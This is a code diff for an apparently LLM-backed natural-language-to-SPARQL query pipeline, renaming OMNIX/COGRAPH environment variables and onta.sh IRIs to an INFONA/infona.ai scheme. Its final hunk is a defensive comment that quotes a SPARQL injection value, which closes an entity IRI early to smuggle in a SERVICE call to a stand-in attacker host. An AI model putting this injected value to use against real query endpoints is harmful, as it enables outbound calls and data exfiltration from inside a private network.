@@ -57,7 +57,7 @@ from infona_client.spatiotemporal.routing import (
     parse_spatial_intent,
 )
 
-logger = structlog.stdlib.get_logger("cograph.nlp.pipeline")
+logger = structlog.stdlib.get_logger("infona.nlp.pipeline")
 
 # In-memory ontology cache: {graph_uri: (summary_str, timestamp)}
 _ontology_cache: dict[str, tuple[str, float]] = {}
@@ -137,7 +137,7 @@ ONTOLOGY_EMPTY = "No ontology defined yet."
 # Neptune (1–2.5 NCU). The semaphore keeps the round-trip count bounded
 # regardless of column count, trading a little latency for stability.
 MAX_ENUM_DISCOVERY_CONCURRENCY = int(
-    os.environ.get("OMNIX_ENUM_DISCOVERY_CONCURRENCY", "8")
+    os.environ.get("INFONA_ENUM_DISCOVERY_CONCURRENCY", "8")
 )
 
 # Active-type probe bounds (ONTA-427). The probe answers "which DECLARED types
@@ -152,20 +152,20 @@ MAX_ENUM_DISCOVERY_CONCURRENCY = int(
 # than one sequential scan, so we deliberately fall back to the scan there. That
 # is the pre-ONTA-427 behavior, which is correct, just expensive.
 MAX_ACTIVE_TYPE_PROBE_URIS = int(
-    os.environ.get("OMNIX_ACTIVE_TYPE_PROBE_MAX", "600")
+    os.environ.get("INFONA_ACTIVE_TYPE_PROBE_MAX", "600")
 )
 # Candidate URIs per probe query, keeping one query's text around 10 to 15 KB
 # (roughly 180 bytes per existence subselect) instead of one ~100 KB query.
 # Chunks run concurrently, bounded by MAX_ACTIVE_TYPE_PROBE_CONCURRENCY.
 ACTIVE_TYPE_PROBE_CHUNK = int(
-    os.environ.get("OMNIX_ACTIVE_TYPE_PROBE_CHUNK", "60")
+    os.environ.get("INFONA_ACTIVE_TYPE_PROBE_CHUNK", "60")
 )
 # Simultaneous probe queries. Mirrors the enum-discovery cap (COG-58) so the
 # probe can never exceed the concurrency this same fetch deliberately caps
 # elsewhere against serverless Neptune.
 MAX_ACTIVE_TYPE_PROBE_CONCURRENCY = int(
     os.environ.get(
-        "OMNIX_ACTIVE_TYPE_PROBE_CONCURRENCY", str(MAX_ENUM_DISCOVERY_CONCURRENCY)
+        "INFONA_ACTIVE_TYPE_PROBE_CONCURRENCY", str(MAX_ENUM_DISCOVERY_CONCURRENCY)
     )
 )
 
@@ -175,14 +175,14 @@ RDF_TYPE_URI = "http://www.w3.org/1999/02/22-rdf-syntax-ns#type"
 _alias_cache: dict[str, tuple[dict[str, str], float]] = {}
 
 # Query generation provider config.
-# OMNIX_LLM_BASE_URL / OMNIX_QUERY_BASE_URL let self-hosted OpenAI-compatible
+# INFONA_LLM_BASE_URL / INFONA_QUERY_BASE_URL let self-hosted OpenAI-compatible
 # endpoints (vLLM, Ollama, LiteLLM) serve /ask without a source patch
 # (OSS dogfood S8). Fall back to the public OpenRouter host.
 def _openrouter_base() -> str:
     return (
-        os.environ.get("OMNIX_QUERY_BASE_URL")
-        or os.environ.get("OMNIX_LLM_BASE_URL")
-        or os.environ.get("OMNIX_OPENROUTER_BASE_URL")
+        os.environ.get("INFONA_QUERY_BASE_URL")
+        or os.environ.get("INFONA_LLM_BASE_URL")
+        or os.environ.get("INFONA_OPENROUTER_BASE_URL")
         or "https://openrouter.ai/api/v1"
     ).rstrip("/")
 
@@ -199,16 +199,16 @@ def _default_query_provider() -> str:
     (OSS dogfood S1/S2/S4/S5). When Cerebras is not configured but OpenRouter
     is, default to OpenRouter.
     """
-    explicit = os.environ.get("OMNIX_QUERY_PROVIDER")
+    explicit = os.environ.get("INFONA_QUERY_PROVIDER")
     if explicit:
         return explicit.strip().lower()
     has_openrouter = bool(
         os.environ.get("OPENROUTER_API_KEY")
-        or os.environ.get("OMNIX_OPENROUTER_API_KEY")
+        or os.environ.get("INFONA_OPENROUTER_API_KEY")
     )
     has_cerebras = bool(
         os.environ.get("CEREBRAS_API_KEY")
-        or os.environ.get("OMNIX_CEREBRAS_API_KEY")
+        or os.environ.get("INFONA_CEREBRAS_API_KEY")
     )
     if has_openrouter and not has_cerebras:
         return "openrouter"
@@ -216,7 +216,7 @@ def _default_query_provider() -> str:
 
 
 def _default_query_model(provider: str | None = None) -> str:
-    explicit = os.environ.get("OMNIX_QUERY_MODEL")
+    explicit = os.environ.get("INFONA_QUERY_MODEL")
     if explicit:
         return explicit
     prov = (provider or _default_query_provider()).lower()
@@ -237,7 +237,7 @@ DEFAULT_QUERY_PROVIDER = _default_query_provider()  # cerebras, openrouter, or a
 # reasoning), and a second consecutive length-truncation falls back to the
 # non-reasoning OpenRouter/Anthropic JSON path entirely.
 CEREBRAS_LENGTH_RECOVERY_TOKENS = int(
-    os.environ.get("OMNIX_QUERY_LENGTH_RECOVERY_TOKENS", "6144")
+    os.environ.get("INFONA_QUERY_LENGTH_RECOVERY_TOKENS", "6144")
 )
 
 
@@ -374,7 +374,7 @@ def _parse_sparql_gen_json(content: str) -> dict:
 # hard-coded 20 silently dropped most of a wide "list all ..." result; raise it
 # and make it tunable. Truncation is now stated prominently (not buried) AND
 # the slice is deterministic because generated SELECTs get a stable ORDER BY.
-ANSWER_ROW_CAP = int(os.environ.get("OMNIX_ANSWER_ROW_CAP", "100"))
+ANSWER_ROW_CAP = int(os.environ.get("INFONA_ANSWER_ROW_CAP", "100"))
 
 # Embedding service singleton
 _embedding_service = None
@@ -647,7 +647,7 @@ class NLQueryPipeline:
         self.neptune = neptune
         self.anthropic = anthropic.AsyncAnthropic(api_key=anthropic_key)
         # Optional GraphStore for the Neo4j /ask path (E6). When None, the
-        # Cypher path uses :func:`get_graph_store` under COGRAPH_GRAPH_BACKEND=neo4j.
+        # Cypher path uses :func:`get_graph_store` under INFONA_GRAPH_BACKEND=neo4j.
         self._graph_store = graph_store
         from infona_client.config import settings
         self._openrouter_key = settings.openrouter_api_key or os.environ.get("OPENROUTER_API_KEY", "")
@@ -656,13 +656,13 @@ class NLQueryPipeline:
         # workers that load .env late) still get the smart OpenRouter default.
         self._query_provider = _default_query_provider()
         self._query_model = _default_query_model(self._query_provider)
-        # Refresh base URL live so OMNIX_LLM_BASE_URL is honored without reimport.
+        # Refresh base URL live so INFONA_LLM_BASE_URL is honored without reimport.
         global OPENROUTER_BASE
         OPENROUTER_BASE = _openrouter_base()
         # Attribute aliases (ADR 0002 §7): resolve renamed attribute IRIs in
         # generated SPARQL. Default OFF so the default Neptune call pattern
-        # stays byte-identical (same gating pattern as COGRAPH_ER_ENABLED).
-        self._aliases_enabled = os.environ.get("COGRAPH_ALIASES_ENABLED", "0") == "1"
+        # stays byte-identical (same gating pattern as INFONA_ER_ENABLED).
+        self._aliases_enabled = os.environ.get("INFONA_ALIASES_ENABLED", "0") == "1"
         # Spatio-temporal read routing (ONTA-157 Phase 2 → ONTA-249): a
         # geo/proximity question is answered directly from the secondary index (no
         # Neptune round-trip). Now a SUPPORTED path and ENABLED BY DEFAULT (ONTA-249):
@@ -672,9 +672,9 @@ class NLQueryPipeline:
         # through to SPARQL unchanged) whenever the question isn't spatial, the KG
         # can't be scoped, the intent doesn't parse, or the anchor can't be
         # resolved — so enabling it cannot regress a non-spatial query. Set
-        # COGRAPH_SPATIAL_ROUTING_ENABLED=0 to force it off (e.g. byte-stable evals).
+        # INFONA_SPATIAL_ROUTING_ENABLED=0 to force it off (e.g. byte-stable evals).
         self._spatial_routing_enabled = (
-            os.environ.get("COGRAPH_SPATIAL_ROUTING_ENABLED", "1") != "0"
+            os.environ.get("INFONA_SPATIAL_ROUTING_ENABLED", "1") != "0"
         )
         # Honest-answer per-fact metadata (ONTA-280, P7): attach per-cited-fact
         # verdict/confidence/recency + a coverage caveat to a successful answer.
@@ -682,7 +682,7 @@ class NLQueryPipeline:
         # pattern as the alias/spatial features above) — a byte-stable eval is
         # unaffected. Purely additive, read-only, post-execution.
         self._answer_citations_enabled = (
-            os.environ.get("COGRAPH_ANSWER_CITATIONS_ENABLED", "0") == "1"
+            os.environ.get("INFONA_ANSWER_CITATIONS_ENABLED", "0") == "1"
         )
 
     async def ask(
@@ -713,7 +713,7 @@ class NLQueryPipeline:
         today), the answer + caveat are byte-identical to the prior behavior.
 
         use_cypher (E6, opt-in / env-gated): when True, or when
-        ``COGRAPH_GRAPH_BACKEND=neo4j``, generate and execute Cypher via
+        ``INFONA_GRAPH_BACKEND=neo4j``, generate and execute Cypher via
         GraphStore instead of SPARQL/Neptune. Default Neptune SPARQL path is
         unchanged when the flag/env is off.
         """
@@ -1735,7 +1735,7 @@ class NLQueryPipeline:
             return NLResult(
                 answer=(
                     "Could not answer: Neo4j GraphStore is not configured "
-                    "(set COGRAPH_GRAPH_BACKEND=neo4j and inject a store)."
+                    "(set INFONA_GRAPH_BACKEND=neo4j and inject a store)."
                 ),
                 sparql=cypher_preview,
                 explanation=gen.get("explanation") or "",
@@ -2831,7 +2831,7 @@ class NLQueryPipeline:
                     # ONTOLOGY_FETCH_ERROR`, so letting `_type_uri_for` /
                     # `_attr_uri_for` raise on ONE bad name would replace the
                     # ENTIRE schema summary with "ontology unavailable" for every
-                    # NL query in the workspace — the onta-oss#274 all-or-nothing
+                    # NL query in the workspace — the infona-oss#274 all-or-nothing
                     # failure, on the hottest read path there is. One unqueryable
                     # type is the honest cost; a blinded planner is not.
                     if skip_invalid_type_name(tl, "ask_ontology_summary"):
@@ -3286,15 +3286,15 @@ class NLQueryPipeline:
 
         Strategy:
         1. Extract ALL valid URIs from the ontology summary (attributes + relationships)
-        2. Find ALL graph.onta.sh URIs in the SPARQL
+        2. Find ALL graph.infona.ai URIs in the SPARQL
         3. For each URI not in the valid set, fuzzy-match against valid URIs
         4. Replace with the best match if similarity is high enough
 
         Common mistakes this catches:
-        - <https://graph.onta.sh/bedrooms> → <https://graph.onta.sh/types/Property/attrs/bedrooms>
-        - <https://graph.onta.sh/onto/bedrooms> → <https://graph.onta.sh/types/Property/attrs/bedrooms>
-        - <https://graph.onta.sh/types/Property/attrs/property_type> → .../attrs/home_type
-        - <https://graph.onta.sh/Property> → <https://graph.onta.sh/types/Property>
+        - <https://graph.infona.ai/bedrooms> → <https://graph.infona.ai/types/Property/attrs/bedrooms>
+        - <https://graph.infona.ai/onto/bedrooms> → <https://graph.infona.ai/types/Property/attrs/bedrooms>
+        - <https://graph.infona.ai/types/Property/attrs/property_type> → .../attrs/home_type
+        - <https://graph.infona.ai/Property> → <https://graph.infona.ai/types/Property>
         """
         import re
         from difflib import SequenceMatcher
@@ -3302,7 +3302,7 @@ class NLQueryPipeline:
         # Step 1: Build the set of ALL valid URIs from the ontology
         valid_uris: dict[str, str] = {}  # name → full URI
 
-        # Attribute URIs: "attr_name (type) — URI: <https://graph.onta.sh/types/Type/attrs/attr_name>"
+        # Attribute URIs: "attr_name (type) — URI: <https://graph.infona.ai/types/Type/attrs/attr_name>"
         for match in re.finditer(rf"URI: <({re.escape(IRI_BASE)}/types/(\w+)/attrs/(\w+))>", ontology_summary):
             full_uri = match.group(1)
             attr_name = match.group(3)
@@ -3310,13 +3310,13 @@ class NLQueryPipeline:
             # Also index by type/attr for disambiguation
             valid_uris[f"{match.group(2)}/{attr_name}"] = full_uri
 
-        # Relationship URIs: "predicate URI: <https://graph.onta.sh/onto/pred_name>"
+        # Relationship URIs: "predicate URI: <https://graph.infona.ai/onto/pred_name>"
         for match in re.finditer(rf"predicate URI: <({re.escape(IRI_BASE)}/onto/(\w+))>", ontology_summary):
             full_uri = match.group(1)
             pred_name = match.group(2)
             valid_uris[pred_name] = full_uri
 
-        # Type URIs: "Type: TypeName — URI: <https://graph.onta.sh/types/TypeName>"
+        # Type URIs: "Type: TypeName — URI: <https://graph.infona.ai/types/TypeName>"
         for match in re.finditer(rf"URI: <({re.escape(IRI_BASE)}/types/(\w+))>", ontology_summary):
             full_uri = match.group(1)
             type_name = match.group(2)
@@ -3325,7 +3325,7 @@ class NLQueryPipeline:
 
         valid_uri_set = set(valid_uris.values())
 
-        # Step 2: Find and fix all graph.onta.sh URIs in the SPARQL
+        # Step 2: Find and fix all graph.infona.ai URIs in the SPARQL
         def _fix_uri(m: re.Match) -> str:
             uri = m.group(1)
 
@@ -3347,9 +3347,9 @@ class NLQueryPipeline:
                 return m.group(0)
 
             # Extract the "name" part from the URI for matching
-            # e.g., "https://graph.onta.sh/bedrooms" → "bedrooms"
-            # e.g., "https://graph.onta.sh/onto/listed_by" → "listed_by"
-            # e.g., "https://graph.onta.sh/types/Property/attrs/property_type" → "property_type"
+            # e.g., "https://graph.infona.ai/bedrooms" → "bedrooms"
+            # e.g., "https://graph.infona.ai/onto/listed_by" → "listed_by"
+            # e.g., "https://graph.infona.ai/types/Property/attrs/property_type" → "property_type"
             parts = uri.replace(f"{IRI_BASE}/", "").rstrip("/").split("/")
             name = parts[-1] if parts else ""
 
@@ -3553,7 +3553,7 @@ class NLQueryPipeline:
         ``max_rows`` bounds how many rows are fed to the narrative LLM (a
         deliberate sample, not the full answer — the plain-text answer in
         ``_format_answer`` carries all rows up to ANSWER_ROW_CAP). Defaults to
-        OMNIX_REPHRASE_MAX_ROWS (30) so a wide result can't blow the summarizer's
+        INFONA_REPHRASE_MAX_ROWS (30) so a wide result can't blow the summarizer's
         context; the truncation is already stated to the model. Now that
         generated SELECTs get a deterministic ORDER BY, this sample is stable
         across runs instead of an arbitrary slice.
@@ -3565,7 +3565,7 @@ class NLQueryPipeline:
             return ""
 
         if max_rows is None:
-            max_rows = int(os.environ.get("OMNIX_REPHRASE_MAX_ROWS", "30"))
+            max_rows = int(os.environ.get("INFONA_REPHRASE_MAX_ROWS", "30"))
 
         # Same hygiene as _format_answer: never feed internal/housekeeping
         # predicate rows (er/*, onto/norm/*, onto/batch_id, …) to the narrative
@@ -3898,9 +3898,9 @@ class NLQueryPipeline:
         """Extract a human-readable name from an Infona URI.
 
         Examples:
-            https://graph.onta.sh/entities/Movie/12345 → 12345
-            https://graph.onta.sh/types/Movie → Movie
-            https://graph.onta.sh/entities/ConsumerComplaint/1431838 → 1431838
+            https://graph.infona.ai/entities/Movie/12345 → 12345
+            https://graph.infona.ai/types/Movie → Movie
+            https://graph.infona.ai/entities/ConsumerComplaint/1431838 → 1431838
         """
         from urllib.parse import unquote
         path = unquote(uri.replace(f"{IRI_BASE}/", ""))
@@ -3933,7 +3933,7 @@ class NLQueryPipeline:
         # A value that merely STARTS with the entities prefix and then carries
         # `>` closes the IRI early, and the rest of it becomes query syntax:
         #
-        #     https://graph.onta.sh/entities/X> } SERVICE <http://attacker/> { … } }#
+        #     https://graph.infona.ai/entities/X> } SERVICE <http://attacker/> { … } }#
         #
         # parses cleanly and gives the attacker an outbound SERVICE call from
         # inside the VPC. That is the same channel rule C rejects on the raw
